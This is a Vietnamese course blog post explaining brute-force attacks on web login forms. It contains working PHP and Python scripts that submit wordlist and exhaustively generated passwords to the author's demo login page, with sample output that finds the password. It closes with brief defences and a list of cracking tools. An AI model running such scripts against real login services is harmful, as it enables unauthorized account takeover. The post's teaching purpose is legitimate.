---
layout: post
title: Hiểu thêm về tấn công brute force
date: 2015-08-23 11:28
categories: CSATT attack
---
Hôm trước thầy Tuấn Anh đã nhắc đến phương pháp này, tuy nhiên tôi sẽ làm rõ thêm một số vấn đề, đây không phải là một bài giải cặn kẽ cho các bạn, nó mang tính định hướng nhiều hơn.

# Code sample
Giả sử tôi có trang đăng nhập là http://tqk.itps.com.vn/demo.php. tôi sẽ tiến hành brute mật khẩu của user: test@demo.brute

PHP:
{% highlight php startinline=true %}
<?php
$dic = ['demo', '123', '1234', '123456', 'test', 'demo1', 'demo123', '123demo'];
foreach ($dic as $password) {
  $email = 'test@demo.brute';
  $url = 'http://tqk.itps.com.vn/demo.php';
  $data_string = 'email=' .urldecode($email). '&password=' .urlencode($password);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $result = curl_exec($ch);
  curl_close($ch);
  if (strpos($result, 'talent') == false){
    echo "<pre> Password: " .$password. " => Wrong password!</pre>";
  } else{
    echo "<pre> Password: " .$password. " => You got it.</pre>";
  }
  
  }
?>
{% endhighlight %}

Run test:

{% raw %}
Password: demo => Wrong password!
Password: 123 => Wrong password!
Password: 1234 => Wrong password!
Password: 123456 => Wrong password!
Password: test => Wrong password!
Password: demo1 => Wrong password!
Password: demo123 => You got it.
Password: 123demo => Wrong password!
{% endraw %}
Python:

{% highlight python linenos %}
import requests
pwlist = ['demo', '123', '1234', '123456', 'test', 'demo1', 'demo123', '123demo']
url = 'http://tqk.itps.com.vn/demo.php'
for password in pwlist:
  payload = {'email':'test@demo.brute', 'password':password}
  req = requests.post(url, data=payload)
  if('talent' in req.text):
    print('Password found:', password)
{% endhighlight %}


{% raw %}
Admin@LEOK-PC
$ py demobrute.py
Password found: demo123
{% endraw %}
Trên đây tôi đã demo cho các bạn phương pháp brute bằng từ điển - dictionary hay wordlist ( từ điển ở đây chính là array/list tôi đưa vào, thông thường thì lấy từ điển từ file). tôi sẽ không đi sâu vào code ( nếu như một số bạn không hiểu), mà chủ yếu là để các bạn nhìn ra rằng phương pháp tấn công này được áp dụng như thế nào. Nói thêm rằng thông thường các worldlist sẽ được khởi tao thông qua các thuật toán, pattern để giảm bớt các mật khẩu "vô nghĩa", nhưng không phải luôn luôn như thế.

Việc tấn công có hay không sử dụng từ điển đều được hoạt động trên cùng cơ chế, tức là bạn sẽ phải generate ra các password theo pattern ( bao nhiêu kí tự, thường hay hoa, hay giả sử đã biết kí tự gì đó...v.v..) rồi lần lượt thực hiện việc đăng nhập và dựa vào kết quả trả về để xác định mật khẩu đúng.

Xem ví dụ sau, ở đây tôi sử dụng itertools trong python để generate wordlist:

{% highlight python linenos %}
import requests
import itertools
import time
charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
url = 'http://tqk.itps.com.vn/demo.php'
res = itertools.product(charset, repeat=6)
start_time = time.time()
for i in res:
    password = ''.join(i)
    payload = {'email':'test@demo.brute', 'password':password}
    req = requests.post(url, data=payload)
    print('Trying password: ', password)
    if('talent' in req.text):
        print('Password found:', password)
        print('\nTaken %s seconds to crack very easy password' %time.time() - start_time)
    else:
        print('Failed.....')
{% endhighlight %}

Và khi tôi chạy đoạn code này, với một máy tính "bình dân" của tôi, ước tính phải mất đến hơn 3 năm để có thể duyệt hết được số lượng hơn 2 tỉ mật khẩu đơn giản có độ dài 7 kí tự chỉ bao gồm chữ cái thường và chữ số. ( Ở đây tôi không đề cập đến việc perfomance, multithreading, đường truyền, sử dụng GPU và một số vấn đề khác). Một con số đáng kể.

Đa số các tấn công brute force áp dụng vào các dịch vụ đăng nhập web/server ( via GET/POST) và tấn công vào các mã hóa, hàm băm ( sau này các bạn sẽ được tìm hiểu về hàm băm trong môn CSLT Mật mã), SSH, cùng một số sản phẩm khác.

Tôi sẽ nói qua về việc brute hàm băm (sử dụng thuật toán "một chiều" tức là có mã hóa nhưng không có giải mã), đó là chúng ta sử dụng các bản rõ, nằm trong wordlist, rồi thực hiện mã hóa sau đó so sánh với bãn mã cần crack. Tất nhiên, các mật mã hàm băm vẫn có xác suất trùng lặp, có nghĩa là có thể có 2 bản rõ nhưng cùng một bản mã, tuy nhiên xác suất này rất nhỏ, đủ để người ta chấp nhận được.

Có thể hiểu việc brute giống như các bạn đang thử làm một điều gì đó có phù hợp với tôi hay không, như thử giày, thử công việc, thử người yêu ;))) Đại khái là như thế đó.

# Protection

Vậy chắc chắn tấn công brute force sẽ phá vỡ tính chất của ATTT của một hệ thống thông tin nếu không có biện pháp khắc phục. Về cơ bản, các máy chủ có nhiều cách để bảo về khỏi các cuộc tấn công đơn giản này bằng cách cấu hình rule cho firewall, hoặc cũng có thể áp dụng ngay trên các ứng dụng đăng nhập, như captcha là một ví dụ điển hình, hay việc giới hạn số lần đăng nhập thất bại trong khoảng thời gian nào đó. Bạn đọc có thể tự tìm hiểu thêm.

# More information

* Trong suốt bài viết tôi không hề muốn sử dụng đến từ "mật khẩu", vì đơn giản, chúng ta đang học một môn chuyên nghành, và tôi nghĩ "mật khẩu" không phải là từ có thể thay thế cho "password".

* Trên bài viết tôi có đề cập đến việc sử dụng code cho việc brute force, tuy nhiên, hiện tại có rất nhiều công cụ mạnh mẽ giúp chúng ta tạo wordlist, crack hash, crack network password có thể kể đến như [John The Ripper](http://www.openwall.com/john/), [Hashcat](http://hashcat.net/oclhashcat/), [Hydra](https://github.com/vanhauser-thc/thc-hydra), [burpsuite](https://portswigger.net/burp/), [cewl](https://digi.ninja/projects/cewl.php)

* Toàn bộ code các bạn có thể xem [tại đây](https://github.com/bytekve/bytekve.github.io/tree/master/codesample).